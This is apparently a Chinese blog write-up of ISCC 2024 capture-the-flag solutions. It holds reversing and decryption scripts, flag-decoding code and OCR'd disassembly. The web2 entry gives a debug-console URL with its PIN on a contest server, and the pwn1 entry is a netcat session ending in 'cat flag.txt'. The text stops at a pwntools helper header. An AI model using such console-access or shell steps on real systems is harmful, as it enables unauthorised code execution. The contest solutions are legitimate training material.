---
title: '2024 ISCC Writeup'
description: '三个数据依次填入exp，注意：第三个需要按h转换16进制，取前四位'
pubDate: 2024-05-10
author: 'IHK-1'
tags: ['CTF', 'ISCC', '2024']
---

# WEB
## 1.web1
<!-- 这是一张图片，ocr 内容为：次源代码 应用程序 性能 >元素 网络 控制台 欢迎 内存 工作区 页面 WORLDISX INDEXJS 150 //特效步进 TOP  FOR (LET E OF THIS.EFFECTS) 151 101.200.138.180:17345 152 E GOSTEP(); BUILDINGS 153 了 154 THIS.TIME++; BULLYS 1/检查是否所有怪物都被消灭了 155 EFFECT 3(0) F(THIS.MONSTERS.SIZE -S O & THIS.LASTMONSTERCOUNT 156 IF 检查是否刚刚完成第三波,并且尚未弹出提示 ICON 157  IF (THIS.MONSTERFLOW.LEVEL - 1 -- 158 - 3 & !THIS MASAICI LCUROTCUITCITEWAV IMGS ALERT("恭喜,您已消灭第3波怪物,这是第一条提 : OWLS SKETCH SHADOWS" 159 MODEL THIS.HASALERTEDFORCURRENTWAVEL - TRUE; 160 5/GHAOTU 161 MONSTER 162 F(THIS.MONSTERFLOW.LEVEL 10&&!THIS. SAIERTEARORCU SOUND 163 RIVERS SING 这是第二条提示 ALERT("恭喜,您已消灭第10波怪物, CRYSTA 164 TOWERS THIS.HASALERTEDFORCURRENTWAVE2 TRUE; 165 (索引) (THIS.MONSTERFLOW.LEVEL - 1 -1 - 1000000000000000000000 & 166 THIS ICI LCUI ON TICHLWAVCO/ 1 INDEXJS ALERT("恭喜,您已消灭第10000波怪物,这是第三条提示 167 GRIFFINS GUARD GALAXIES") 168 E3TRUE;// 设置之 S.HASALERTEDFORCURRENTWAVE3 WORLDJS 169 INDEX.CSS 170 INDEX.LESS 171 THIS.LASTMONSTERCOUNT - THIS,MONSTERS.SIZE; 172 1/如果怪物数量由0变为大于0,表示新的波次开始,重置提示标记 173 174 (THIS.MONSTERS.SIZE> 0 && THIS.LASTMONSTERCOUNT COUNT SS 0 175 THIS.HASALERTEDFORCURRENTWAVE1 -FALSE; 176 THIS HASALERTEDFORCURRENTWAVE2 FALSE; 177 HASALERTEDFORCURRENTWAVE3 FALSE; 178 子 179 180 181 木木 以这个世界自己的情况来添加怪物 182 恭喜 4个匹配项 GB 行165,列14夏盖范围:不适用 -->


```plain
ISCC{MDWTSGTMM + 各个字符的首字母拼接}
```

## 2.web2
```plain
http://101.200.138.180:10006/console?pin=252-749-991
```

# MISC
## 1.misc1
```plain
192.168.1.2,192.168.1.4,24,2024,192.168.1.3,192.168.1.5,0.06,192.168.1.2,192.168.1.3,192.168.1.6,CRC16,4,1

adcca5c2a82064a17a645d35b6b054cd
```

## 2.misc2
```python
from PIL import Image
import openpyxl
from pyzbar import pyzbar


def get_data(path):
    wb = openpyxl.load_workbook(path)
    sheet = wb.active
    data = []


    for row in sheet.iter_rows():
        for cell in row:
            if not cell.font.bold:
                data.append((cell.row, cell.column))

    return len(list(sheet.iter_rows())) + 1, data


def get_image(size, data):
    out = Image.new('L', (size, size))
    for item in data:
        out.putpixel((item[0], item[1]), 255)
    return out


size, data = get_data('attachment-1.xlsx')
qrcode = get_image(size, data)
data = pyzbar.decode(qrcode)[0].data.decode().strip()
print('ISCC{' + data + '}')

```

## 3.misc3
<!-- 这是一张图片，ocr 内容为：PUZZLESOLVER-PRO V2.0 BUILD:2024-3-3 6群:761594154 AUTHOR:BYXS20 关于 流量处理 文本处理 图像处理 密码处理 文件处理 BASE TOOLS BIN TOOLS TEXTTOOLS FREQUENCYCOUNT BASE32,64补全: V2XOA2RSQUNCG VTFWT1FSB3DIRWXUYIHOCVRXEFOKMWRXVG05AFJYUIZZEK5 VTFSS2MYULDHM2XSUKZAAFVQRIZORMXXWXPWBGJWSKPV HVFVZEVJREGHXRLPVWKCXDMVSVIZVBTVVTVUWMVIXMVDXR MJEOV2XANIFYSUNBUO1VUZG 1JITVZCYVYWWNZWREZ/TUDKRGRHEGPNMEI4VMPGO2RGU VTFSS2MYULDHM2XSUKVAAFVARIZORMW2VGXOBFYWWILUBG XISA3BOTURSB1ZTNU9VRIL6VW5OBFDIONPARMRLYVDFELZRDF MXVVZVEU9EBEVVUW DSEKZ3WWPOS2RHSKHTA1ZPYMXVD1Z-ZDRIVTVFVG5AA2FSS VTFSS2MYULDHM2XSUKVAAFVQRIZORMRVVGS5TLIWNTBZA2HX NRZBGUXYUZKSGRESMPHVGX5WKZINEOVSKHKRXBPTTBKMVD WVDWCVREEVWCJ VTFSS2MVULDHM2XSUKVAAFVARIZORMRVVGS5TUUTKIZA2HHV WVJRIBVJWYTNWAVIZUKTAVZEWTWXKVVRUUMLSMHBGWWOW DOOYRNRISEJQVIVATVJGZQ VZVEU9EBEVVUT VTESS1UVSKDISFLOUO7 AAF7UOKINRMRXYUC5A17XEF77WHB VTFWT1FSB3DIRWXUYLHOCVRXEFPKMWRYYKC5AFZYUIZZEKJ6 VGC BASE32,64隐写(二进制): VTFWT1FSB3DIRWHYYMXWCVIWZG9KMWXOTIZKYU1RWIVWRI 0110100100110011001100000111010101010001000111011101 JZU2XKRIJUTIRWV1JSV2PGQ1JGUNVVBHBYUJJNEFZETNNRMK 1000110100001101110100010100010101001100011001000000 5GZERWAKOWSKVXBM93T1VSVQ 0000000000000000000000000000000000000000000000000000000 VTFWT1FSB3DIRWXGTUHOTW 000000000000000000000000000000000000 VTFWT1FSB3DIRVJSVJJSS1VUQKTJVMRXV2PCALJTAFVVIJZU2X JD05XOVDLA3B6V2TWC1JHTXLARNBOYTNCCFDWWLPKMDR3V GO1UVZEOK8 VTFWT1FSB3DIRVJSVISS1VUQKTKMWROYKC5AGJHEFHARWH DV1ZVD1JYSIZSAZVDWIZWMFDXTXDJMDQ VTFWT1FSB3DIRVJVVIJSS1ZEOKDIBESWVGTKYU1XDDVVBTFL YUZVELRQULHSAZVDWTJ4Q1ZGULLHRKJRTWPNNVJGUQ BASE32,64隐写(二进制转ASCII): VTFWT1FSB3DIRVJSVIJSS1VUOKDIBESWVGTKYU1XDDVVBTFL I30UB7CCTQLD YUZACVFTNVVSBEYZV2PBEGNXTXDJMDQ VTFWT1FSB3DIRVJSVJSS1VUQKPOVKV5WXPSUWVUQQ BASE32(PADDING) OBASE64 BASE32 解码 清空 打开文本 -->


## 4.misc4
```python
import struct

path_list = [r"C:\Users\HK\Desktop\left_foot_invert.png", r"C:\Users\HK\Desktop\left_hand_invert.png",
             r"C:\Users\HK\Desktop\right_foot_invert.png", r"C:\Users\HK\Desktop\right_hand_invert.png"]
data_list = []
png_end = b'IEND\xaeB`'

for path in path_list:
    data = open(path, 'rb').read()
    data = data[data.index(png_end) + len(png_end) + 1:]

    xor_data = b''
    for byte in data:
        xor_data += struct.pack('B', byte ^ 0xff)

    data_list.append(xor_data)

out_data = b''
for i in range(len(data_list[3])):
    for data in data_list:
        out_data += struct.pack('B', data[i])

with open(r"C:\Users\HK\Desktop\out.zip", 'wb') as f:
    f.write(out_data)

```

```python
with open(r"C:\Users\HK\Desktop\true_flag.jpeg", 'rb') as f:
    c = f.read()
from Crypto.Util.number import *

c = bytes_to_long(c)
p = 167722355418488286110758738271573756671
q = 100882503720822822072470797230485840381

e = 65537
d = inverse(e, (p - 1) * (q - 1))
m = pow(c, d, p * q)
print(long_to_bytes(m))

```

# RE
## 1.re1
 追踪check_2

<!-- 这是一张图片，ocr 内容为：IDA 空口 文件 视图调试备 击项 车动 鑫怡 能转空限 咖啡餐 A AI 出口 FASTCALL CHECK_2(CHOR "A1) 晚 RESULT:// EAX PRE.C.IMIT ESULT - (UNSIGNED _INT8)* PRE-EPO_INIE ST*(G F((_BYTE)RESULT 70 ) VISMEINCMSTARTUP INT8)EI(1] (UNSIGNED -83) IF(LSYTE)RESULT -CE_REGISTER_FRIN T CRT INT8)A1(2]; (UNSIGNED IF ( ((_BYTE)RESULT M-66 ) CHECK(CHAR $) INT8)E1[3] RESULT (UNSIGNED IF(((0YTE)RESUIT INT8)E1[4]] _DO_GLEBAL_CTERS INT8)E1(5] OF((BY TE)RESULT 75 75 ) COREGDTOR RESULT (UNSIGNED INT8)EI[6]; EPRCHET IF(((BYTE)RESULT 104) RESULT *(UNSIGNED __INT8)AT[7]; IF(((BYTE)RESULT MM 76 ) PEI 308 RUNTINE RELOOOTER RESULT(UNSIGNED_INT8)AI[A]; IF((_BYTE)RESULT M 103) NINGVTHR.RUN KEY DTERS PURT.0 WOA NINGRTLA . ADD KEY.DTOR SUIT(UNSIGNED INT8)E1(9] ((_BYTE)RESULT -69) RESULT(UNSIGNED_INT8)EI[10]; VELIDOTELNOGEBOS IF ( (BYTE)RESULT M 100) YENDPESEETI ON _YINDPESECTI ENDYYNE _NINGV_GETSEOTIONFERADDRESS RESULT -(UNSIGNED _INTS)E1(12]; INT8)A1(13]3 RESULT (UNSIGNED IF ( LBYTE)RESULT -GET.OUTPAT FORNOT ULT(UNSIGNED_INT8)A1[14]; LF((_BYTE)RESULT 101) _OMEXIT RESULT (UNSIGNED_INT8)E1[15]; IF(((BYTE)RESULT -- 105 ) ST QUL CK EXIT -MACERIT RESULT-(UNSIGNED_INTS)A1(16]; LF(( BYTE)RESULT   100) (CRITE(EWI-PAUFYSIO)-ARNSAJ 000000450_27CHECK_2POT) (140001450) 行 34/106 -->


```python
enc=''
s='''int result; // eax

  result = (unsigned __int8)*a1;
  if ( (_BYTE)result == 70 )
  {
    result = (unsigned __int8)a1[1];
    if ( (_BYTE)result == 83 )
    {
      result = (unsigned __int8)a1[2];
      if ( (_BYTE)result == 66 )
      {
        result = (unsigned __int8)a1[3];
        if ( (_BYTE)result == 66 )
        {
          result = (unsigned __int8)a1[4];
          if ( (_BYTE)result == 104 )
          {
            result = (unsigned __int8)a1[5];
            if ( (_BYTE)result == 75 )
            {
              result = (unsigned __int8)a1[6];
              if ( (_BYTE)result == 76 )
              {
                result = (unsigned __int8)a1[7];
                if ( (_BYTE)result == 118 )
                {
                  result = (unsigned __int8)a1[8];
                  if ( (_BYTE)result == 66 )
                  {
                    result = (unsigned __int8)a1[9];
                    if ( (_BYTE)result == 110 )
                    {
                      result = (unsigned __int8)a1[10];
                      if ( (_BYTE)result == 85 )
                      {
                        result = (unsigned __int8)a1[11];
                        if ( (_BYTE)result == 73 )
                        {
                          result = (unsigned __int8)a1[12];
                          if ( (_BYTE)result == 71 )
                          {
                            result = (unsigned __int8)a1[13];
                            if ( (_BYTE)result == 80 )
                            {
                              result = (unsigned __int8)a1[14];
                              if ( (_BYTE)result == 114 )
                              {
                                result = (unsigned __int8)a1[15];
                                if ( (_BYTE)result == 87 )
                                {
                                  result = (unsigned __int8)a1[16];
                                  if ( (_BYTE)result == 107 )
                                  {
                                    result = (unsigned __int8)a1[17];
                                    if ( (_BYTE)result == 87 )
                                    {
                                      result = (unsigned __int8)a1[18];
                                      if ( (_BYTE)result == 71 )
                                      {
                                        result = (unsigned __int8)a1[19];
                                        if ( (_BYTE)result == 106 )
                                        {
                                          result = (unsigned __int8)a1[20];
                                          if ( (_BYTE)result == 113 )
                                          {
                                            result = (unsigned __int8)a1[21];
                                            if ( (_BYTE)result == 71 )
                                            {
                                              result = (unsigned __int8)a1[22];
                                              if ( (_BYTE)result == 117 )
                                              {
                                                result = (unsigned __int8)a1[23];
                                                if ( (_BYTE)result == 118 )
                                                {
                                                  result = (unsigned __int8)a1[24];
                                                  if ( (_BYTE)result == 68 )
                                                  {
                                                    result = (unsigned __int8)a1[25];
                                                    if ( (_BYTE)result == 76 )
                                                    {
                                                      result = (unsigned __int8)a1[26];
                                                      if ( (_BYTE)result == 54 )
                                                      {
                                                        std::operator<<<std::char_traits<char>>(
                                                          refptr__ZSt4cout,
                                                          "yes, this is a flag\n");
                                                        return getchar();'''.split("\n")
for i in s:
    if "(_BYTE)result" in i:
        enc+=chr(int(i.split("==")[1].split(")")[0].strip().strip("'")))
key=[i for i in b"DABBZXQESVFRWNGTHYJUMKIOLPC"]
print([i+51 for i in key])
index=[]
for i in enc:
    if i in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        index.append("ABCDEFGHIJKLMNOPQRSTUVWXYZ".index(i))
    elif i in "abcdefghijklmnopqrstuvwxyz":
        index.append("abcdefghijklmnopqrstuvwxyz".index(i)+0x1a)
    elif i in "0123456789+/-=!#&*()?;:*^%":
        index.append("0123456789+/-=!#&*()?;:*^%".index(i)+0x34)
    else:
        print("wrong")
print(index)
for i in range(len(index)):
    print(chr((key[i]+index[i])),end='')

```

## 2.re2
upx -d 脱壳

<!-- 这是一张图片，ocr 内容为：文件 专按索视图调试图 空口 中心 专保 选项 安全日照 BINDIIF LUMINA A LUNIAN (限公司 脂肪 外部符号 X TAPORTS IN(INT ARGC, CONST CHER " ARGY, O INT ENVP) 玩 CHAR V5[32]:// [RBP-70H]BYREF CHAR STR[28]; [RBP-SEY] BYREF PRE_OP-INIT CHAR V7[4];// INT64 V8[2]3 7/ [RBO-30H] NOINCKESTORTUP _QMORD V9[2]://[ [RBP-20H] INT V10;//[RSP+84H][RBP-CH] INT IS // [RSP+88H][RBP-BH] CHAR V123 // [RSP+SFH][RBP-1H] ENERYPTI EN(CHER &,CHAR &,INT) TEXT NIX(OHOR *,CHOR *,INT) 0XCE78F800B621315164; SED OPERATORCCCSTD-CHAR_TRAITS(CHER)>(SED:ENV TEL 0X87A70C2895685286U164; ATD.:ENDL(OHOR,STD.:CHOR_TROJ TS(CHOR)(STD.OS ID )(CHER )V9+6)-0X34-687A7164; STD:_ISTRWIN,EATRWET(ATD :ISTREIN A,CHAR *,100. STD ESTREAN OPERATOR((STD OSTREM & (X)(SEESS  TERT TRCPY(STR, SO-THIS-IS-THE-RIGHT-FLAG") __DO_GLEBEL_DTORS STRLEN(STR); STD:IOPERETOR@STDIICHAR TRAITS<CHAR)(REFPTR_25TACOUT, "ENTER THE FLAGI(N")) 21 SETURCY STD::OPERATOR)><CHER,STD;:CHAR_TRAITS<CHAR>>(RETPTR_2ST3CIN,VS)I IF ( V10 )- STRLEN(V5)) MIX(V5,STR,V10)3 26 ENCRYPTLON(V5,V7,V10); 28 IF ( V5[E] I- "((BYTE ")V8+I)) F-NINIAN TON ON DEORS PARS PARS PARS.0 TERT EXIT_0 363 STD::OPERATOR<<STD::CHER TRAITS<CHAR>>(REFPTR_2STACOUT, "CORRECT FLAGL\N"); VAL:DATETNIGEBAS ELSE STD::OPERATOR<STDIICHER TRAITS<CHAR>(REFPTR_25TR_25TACOUT, MRONG FLAGLIN"); YINDFEETI ONDYDLINE _NINPE.CETSECTI ONFORADDRESS 41 RETURN OJ HONWRITABL ENCURR ENTTNOGE STARSSSDRERAPERAPORATDITSHU ERRERSERSSSSLAENDLETTLANTEREACOLLSICEERSEA3SASSCREREANTT 76 E56 ); NINGY WINPORT,LI TR WRY NENSS __CHSTH.M FPRIATF 47 SYSTEN(.PAUSE.); LPRINTF 49 -CET_ONT.FORNAT TEZT AT_GUIOK_EXIT 行 36/107 0000123A   IN:17 (140001C33) -->


三个数据依次填入exp，注意：第三个需要按h转换16进制，取前四位

```cpp
#include<stdio.h>
#include<stdint.h> // Include for int64_t

void decryption(char* enc, char* key, int a3)
{
    char v3; // [rsp+2Bh] [rbp-15h]
    int n; // [rsp+2Ch] [rbp-14h]
    int m; // [rsp+30h] [rbp-10h]
    int k; // [rsp+34h] [rbp-Ch]
    int j; // [rsp+38h] [rbp-8h]
    int i; // [rsp+3Ch] [rbp-4h]
    for (n = 0; n < a3; ++n)
        enc[n] -= 10;
    for (m = 0; m <= a3 - 2; ++m)
        enc[m] += enc[m + 1];
    for (k = 0; k < a3 - 1; ++k)
        enc[k] ^= key[2];
    for (j = 0; j < a3; j += 2)
        enc[j] ^= key[j % 4];
    for (i = 0; i < a3; ++i)
        enc[i] += key[i % 4];
}

int main()
{
    char key2[] = "ISCC";
    int64_t enc[4];
    ((int64_t*)enc)[0] = 0xFC0375D78094C35B;
    ((int64_t*)enc)[1] = 0xF5055BAE15FC7382;
    ((int64_t*)enc)[2] = 0x939BD81D3DD8997A;
    *((int64_t*)(((char*)(&((int64_t*)enc)[3])))) = 0x34DB;
    decryption((char*)enc, key2, 26);
    puts((char*)enc);
}
```

## 3.re3
<!-- 这是一张图片，ocr 内容为：IDA-ATTACHMENT-6.EXE CAUSERS(HK\DESKTOPLATTACHMENT-6.EXE X 视图调试器LUMINA选项窗口 帮助 BINDIFF 文件编辑跳转 搜索 四口无调试器 烟酒 指令 外部符号 常规函数 数据 LUNINA 团数 未知 库因数 &  & PSEUDOCODE-A IDA VI EW-A ZNUNS FUNCTIONS INPORTS VS SUB 4023FE(STD::COUT,"THIS WILL NEVER HAPPEN."););); 函数名称 STD::OSTREAM::OPERATOR<(V5,SUB_402750); 7 SUB 401000 UNKNOWN_LIBNAME_3(V17) -- 24 ) OPERATOR NEW(UINT,ROID*) 39 STD:EXCEPTION::EXCEPTION(CHAR CONST*CONST 40 J - 0;J < UNKNOWN_LIBNAME_3(V17); ++J ) SUB_401050 41 SUB_401090 STD:://WOEPTION::WHAT(WOID) 42 (INT)5%2) SUB_4010PO *(_BYTE*)SUB_401B60(J)+2; 43 STD::BAD_ALLOE::BAD_ALLOO(AHER CONST * EONST 44 ISE SUB_401150 V8**(_BYTE *)SUB_401B60(J)-3; SUB_401180 (BYTE*)SUB 401B60(J) V8; STD:BAD ARRAY NEW LENGTH SUB_4011D0 444 SUB_401620(V16); SUB 401200 LOBYTE(V21)1; SUB_401220 FOR (K " O; K < UNKNOWN_LIBNAME_3(V17); ++TK ) SUB 401240 SUB_401270 *( BYTE*)SUB 40 401B60(K); UNKNOWN LIBNONE_1 401860(K) 48) V9; *)SUB_ UNKNOWN LI BNAME_16 _BYTE SUB 4012DO )SUB_401B60(K F STD:SHARED MUTEX::SHARED MUTES(VOID) FUNKNOWN LIBNAME_2 401B40(V17); JSUB. SUB_401360 57 'V113 SUB_401370 58 [1 SUB_4013A0 0 59 2] V11[2]S SUB 4013CO BUF1[3] 60 VII[3]; SUB_4013P0 BUF1F4I 61 V11[4]; SUB_401440 62 BUF1[5] V11[5]; SUB 401400 63 7018); SUB 401 64 BUF2[E] 180804935; 65 BUF2[1] -1881465345; 66 BUF2[2] UNKNOWN LI BMONE 3 67 387736737; BUF2[3] 1741029177; 68 BUF2[4 STD:STRING:: OPERATOR (CHAR) BUF2[5 796256198; STD:STRING:I STRING(ROID) IF(! 70 UB 401BO0 SUB_4023FO(STD::COUT,"FLAG FOUND!"); 71 V12 SUB_401C10 72 ELSE SUB 401C50 73 V12 - SUB_4023F0(STD::COUT, "FLAG NOT FOUND."); MATEN COUNT PAIR ANONYMOUS NONE SP ACE 74 STD::OSTREAM::OPERATOR<<(V12, SUB_402750); 75 SYSTEM(PAUSE"); .TIDY_DEALLOCATE(VOID) FI LOBYTE(V21)-0; 76 7]SUB_401D70 STD:ISTRING::`STRING(V16); 0 77 F STD:: Z:PUSH_BACK(CHAR) 78 V21-1; F UB 401850 STD::STRING:!~STRING(V17); 0 79 SUB_401EB0 88 RETURN D3 行2/190 5(4017E4) 00000BT4 MAIN:35 AU:1DLE 磁盘:114GB DOWN -->


```python
from ctypes import *
def eqdata(s):
    s = s.replace(";", "").replace(" ", "").split("\n")
    data = []
    for i in s:
        ins = i.split("=")
        data.append(eval(ins[1]))
    return data
def getlbytes(l):
    ans = []
    for i in l:
        get = []
        for j in range(4):
            get.append(i & 0xff)
            i >>= 8
        ans += get
    return ans
key=[ord(i) for i in ('674094872038771148666737')]
def MX(z, y, sum1, k, p, e):
    return c_uint32(((z.value>>5^y.value<<2)+(y.value>>3^z.value<<4))^((sum1.value^y.value)+(k[(p&3)^e.value]^z.value)))
def btea(v,k,n,delta):

    sum1=c_uint32(0)
    n=-n
    rounds=6+52//n
    sum1.value=rounds*delta
    y=c_uint32(v[0])
    e=c_uint32(0)

    while rounds>0:
        e.value=((sum1.value>>2)&3) #e都要32位哦
        for p in range(n-1, 0, -1):
            z=c_uint32(v[p-1])
            #y[p]=c_uint32(v[p]-c_uint32((((z.value>>5^y.value<<2)+(y.value>>3^z.value<<4))^((sum1.value^y.value)+(k[(p&3)^e.value]^z.value)))).value).value
            v[p] = c_uint32(v[p] - MX(z,y,sum1,k,p,e).value).value
            y.value=v[p]

        z=c_uint32(v[n-1])
        #v[n-1]=c_uint32(v[n-1]-c_uint32((((z.value>>5^y.value<<2)+(y.value>>3^z.value<<4))^((sum1.value^y.value)+(k[((n-1)&3)^e.value]^z.value)))).value).value
        v[0] = c_uint32(v[0] - MX(z,y,sum1,k,0,e).value).value
        y.value=v[0]
        sum1.value-=delta
        rounds-=1

    return v

enc=eqdata('''Buf2[0] = 746155582;
    Buf2[1] = 1071098440;
    Buf2[2] = 818944797;
    Buf2[3] = 579286312;
    Buf2[4] = -434804794;
    Buf2[5] = 545235669;''')
key2=[0x12345678, 0x9ABCDEF0, 0xFEDCBA98, 0x76543210]

m=btea(enc, key2, -len(enc), -0x61C88647)
m=getlbytes(m)
for i in range(len(m)):
    m[i]^=(key[i]-ord("0"))
    if i%2==1:
        m[i]-=2
    else:
        m[i]+=3
print("".join(map(chr,m)))


```

## 4.re4
<!-- 这是一张图片，ocr 内容为：OA-BEIXUAN-13.EXE CAUSENS\HIKTOP\BEIXU/AN-13.EXE 文件纳铝制转按家视图调试路 帮动BINDIF LUMINA  透项 空口 4日 A 烟酒 库记数 外部符号 据令 TY SUB_401F40(V16); 风 图数名称 LOBYTE(V21) 13 SUB_401F40(V17)I 7 SUB_40:000 LOBYTE(V21) 23 OPERATOR NEV(MINT WEID X) FOR(I-O3 1 < UNKNOWM_LIBNAME.5(V18);+4I ) ATD :OXOEPEI ON .EXOEPTI ON(CHOR OONST X OONST,IN SUB_401000 WUB_401080 ENCODE(W13,V16); L08YTE(V21)-33 7 SUB-400 300 SUB_4014D0(V14, V17); A THE TIS AR ORO ANAAL TEL TERE TORAOM ANAR LOBYTE(V21)4;4; SUB_402DA0(V15,V13,V14); LOEYTE(V21) 5; 1  60103270 9103 即间创造海海海连锁连锁河河河门道海海海海每年每年每间有海海海海海海海海海海市海市 UNKNOVN LI BANONVE.20 EFFEEFEFEFFEFFEFFEFFEFEEFE E FFEFEFEFEE $UB_401210 STD:SHARED NETER UNKHOVN,LI BNAVE_2 STD:FWKE PROXY.PTR INPL  FALE.PREXY.PTR INGR WB_401370 SUB_401300 FSOB_401470 ROB,4016CO 021-101630 0001001004 V5-(_PWORD )UNKNOWN_11BNEME_3(V8,V9)I SUB 401D70(*V5,V5[1].V7)3 MKNOYN_LI BNWE 4 LOBYTE(V21)6; WNKNOWN LI BNANE.5 TOL TOITIO SUB_4016A0(0XCU)3 SUB 4015C0(V20,V15); SOB_40:390 LOBYTE(V21) 7; IF (UNSIGNED __INTS)SUB_4E16CE(V20,V19))) V6 SUB_402A40(STD:ICOUT,RIGHTI"); ELSE V6 - SUB_402MD(STD::COUT, 'ERRORL'); WUL_401740 SUB_401F80 STD:10STREAM:IOPERATOR<<(V6,SUB_402E30)] SUB_102000 SYSTEN(PEUSE"); V10-03 LOBYTE(V21) - 63 MIKHEVN 11 HESE ? SUB_401CAE(V20); 行 3/244 00000BD7 HALN:20 (401707) -->


```python
def eqdata(s):
    s = s.replace(";", "").replace(" ", "").split("\n")
    data = []
    for i in s:
        ins = i.split("=")
        data.append(eval(ins[1]))
    return data
key1=[ord(i) for i in "ISCC"]
v4=[2, 0, 3, 1, 6, 4, 7, 5, 10, 8, 11, 9]


enc=eqdata('''v8[0] = 0;
    v8[1] = 16;
    v8[2] = 56;
    v8[3] = 20;
    v8[4] = 17;
    v8[5] = 61;
    v8[6] = 50;
    v8[7] = 43;
    v8[8] = 46;
    v8[9] = 52;
    v8[10] = 20;
    v8[11] = 3;
    v8[12] = 67;
    v8[13] = 89;
    v8[14] = 83;
    v8[15] = 89;
    v8[16] = 70;
    v8[17] = 74;
    v8[18] = 63;
    v8[19] = 103;
    v8[20] = 103;
    v8[21] = 125;
    v8[22] = 103;
    v8[23] = 98;''')
enc2=enc[:12]
enc1_2=enc[12:]
flag=[0]*24
for i in range(12):
    flag[2*i+1]=enc1_2[v4[i]]
for i in range(len(enc2)):
    enc2[i]^=key1[i&3]
for i in range(12):
    flag[2*i]=enc2[i]
print("".join(map(chr,flag)))
```

# mobile
## 1.mobile1
<!-- 这是一张图片，ocr 内容为：CAUSERSTHIA.DESKTOPLATTACHMENT-5.APK-JEB FILE EDIT NAVIGATION ACTION ANDREID DEBUGGER WINDOW HELP 国际公司创新公园日品化品看图 OMNIBOX(F3) 阿风小路 RECEIVER/SOURCE 28 ATTACHMENT-5APKJDB2 ATTACHMENT-S.PK VO,STANDARDCHERIETS -UTELSICHARSET PELURN NEW STRING(RECELVER.CUSTERGECRYPE(ERR-B2, ERT BI), SLANDERDCHERSETS.UTF-3)) S COMEXAMPLE.WHATHAPPENED PE RESOURCES ASSETS T WACETVER-SCORBINESTRINES(STRING, STRING)STRING. GO, PI WESSSOSSSE  INVERSTATI OJECT FOR(INTV-OSV<ARR_B.TENGTH; 00000012 NOVE-RESULT-OBJECT PO STRSNG:SGSTIGTESTCHARSOTSTBTSTSPSPS P FILTER TYPE 'ENTER TO VALIDATE :PE         RECEIVER.)CUSTONGNCRYPT([B, [E)[E, PE,VO HO026 MOVE-RESULT-OBJECT PO BYTECODE/HIERARCHY 83 玉亮77. DRIEL) ARR TA - RER BREE SESTESTERECERENTENTYER-CE 8888882E NGN-BRRBY 串 MYJNI SYS TEN ARRAYCOPY(ARR-B, E,AR OMYJNI YZ, IN-2ARRAYSGPY(CBJECT, I, CBJECT, I, 3)V, VO, V3, PT, V3, VS 带 DATABINDING WB,VE G ACTIVITYHAINDINDING SCE SURTEN SETENCORETSTESTE TE CODECT,E,SN,PE,VE,VO,VO,VA C MAINKTIVITY HE INVCKE-VIRTUA)..  DASENCODER-)ENCODETOSTRING((B STRING. PO, PO, PI O RECEIVER CT PO FOR(INT V OJ V < ARR B.LENGTH;*WY)( BETHOD PUBLIG STATT( CENCRYPTZ(STRING)STRING BYTE2HEX(BYTED:STRING COMBINESTRINGS(STRING,STRING):STRIR VO.STANDARDCHARSETS OUTE_S:CH RETURN BASECA.GETENCODER().ENCODETASTRTRTRG(ARE.BI); CUSTOMDECRYPT(BYTELL,BYTE WE-RESULT-OBJECT PO CUSTOMENCRYPTIBYTELL. BYTE@D: BYTEL VO,O 60000000C CONST/4 /STRTRTNG PECRYPTOR:1 SUCCEEDEDED,O FATLED DECRYPT(STRING):STRING PRIVATE STATIC BYTE() GENERETESALT(INT V)( IF 8180888 VA,V2,126 ENCRYPT(STRING.STRING):STRING V2, 0X71 GENERATESALT(INT): BYTE(L V2,V2,0000.00 GEISHA256(STRING):STRING DISASSEEMBLY DESCRIPTION  SOURCE STRINGS CALIGRAPH HIERARCHY O LOGGER D QUICK SEARCH " REFERENCES TERMINAL GOOGLE 申KOTLIN W]NO ANDROID DEVICE DETECTED! 串  LOTLINX HORG : YHU ANGVBEG BEEGRENSTED TOGTED TABES IS SHANNLED AND ACCESSIBLE DAD IT IS RECOMED TO INSTUDIO SOR ANDROLD SOR OR ARDROID STUDIO AITH THE SOR. P FITER TYPE "ENTER TO VALIDATE 出口 977.5M/3.4G -->


```python
import java.nio.charset.StandardCharsets;
import java.util.Base64;


/* loaded from: classes.dex */
public class Test {
    private static String combineStrings(String arg1, String arg2) {
        return arg1 + arg2;
    }
    private static byte[] customEncrypt(byte[] arg4, byte[] arg5) {
        byte[] v0 = new byte[arg4.length];
        int v1;
        for(v1 = 0; v1 < arg4.length; ++v1) {
            v0[v1] = (byte)(arg4[v1] ^ arg5[v1 % arg5.length]);
        }

        return v0;
    }
    public static String encrypt(String arg3, String arg4) {
        byte[] v0 = {97, -78, -20, -24, 105, 98, -8, -110, 0x7B, 120, 14, -87, (byte)0xE0, 21, 10, -46};
        byte[] v3 = customEncrypt(combineStrings(arg3, arg4).getBytes(StandardCharsets.UTF_8), v0);
        byte[] v4 = new byte[v0.length + v3.length];
        System.arraycopy(v0, 0, v4, 0, v0.length);
        System.arraycopy(v3, 0, v4, v0.length, v3.length);
        return Base64.getEncoder().encodeToString(v4);
    }

    public static String encrypt2(String arg3) {
        byte[] v3 = arg3.getBytes(StandardCharsets.UTF_8);
        int v0 = 0;
        int v1;
        for(v1 = 0; v1 < v3.length; ++v1) {
            v3[v1] = (byte)((v3[v1] + 0x7F) % 0x100);
        }

        byte[] v1_1 = new byte[v3.length];
        while(v0 < v3.length) {
            v1_1[v0] = (byte)(v0 % 2 == 0 ? v3[v0] ^ 0x7B : v3[v0] ^ 0xEA);
            ++v0;
        }

        return Base64.getEncoder().encodeToString(v1_1);
    }

    public static void main(String[] args) {
        System.out.println("ISCC{"+encrypt2(encrypt("04999999", "gwC9nOCNUhsHqZm")).substring(0, 0x20)+"}");
    }
}

```

# PWN
## 1.pwn1
```plain
nc 182.92.237.102 10010
>> 5
>> 104
>> Flag
>> cat flag.txt
```

## 2.pwn2
```python
from pwn import *
from struct import *
from ctypes import *
from LibcSearcher import *
from functools import reduce
import gmpy2

c = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
s    =    lambda a              :pw.send(a)
sl   =    lambda a              :pw.sendline(a)
sa   =    lambda a,b            :pw.sendafter(a,b)
sla  =    lambda a,b            :pw.sendlineafter(a,b)
r    =    lambda a=6666         :pw.recv(a)
rl   =    lambda                :pw.recvline()
ru   =    lambda a,b=True       :pw.recvuntil(a,b)
g64  =    lambda                :u64(pw.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
g32  =    lambda                :u32(pw.recvuntil(b'\xf7').ljust(4,b'\x00'))
gl   =    lambda a              :u64(pw.recvuntil(a,drop=True).ljust(8,b'\x00'))
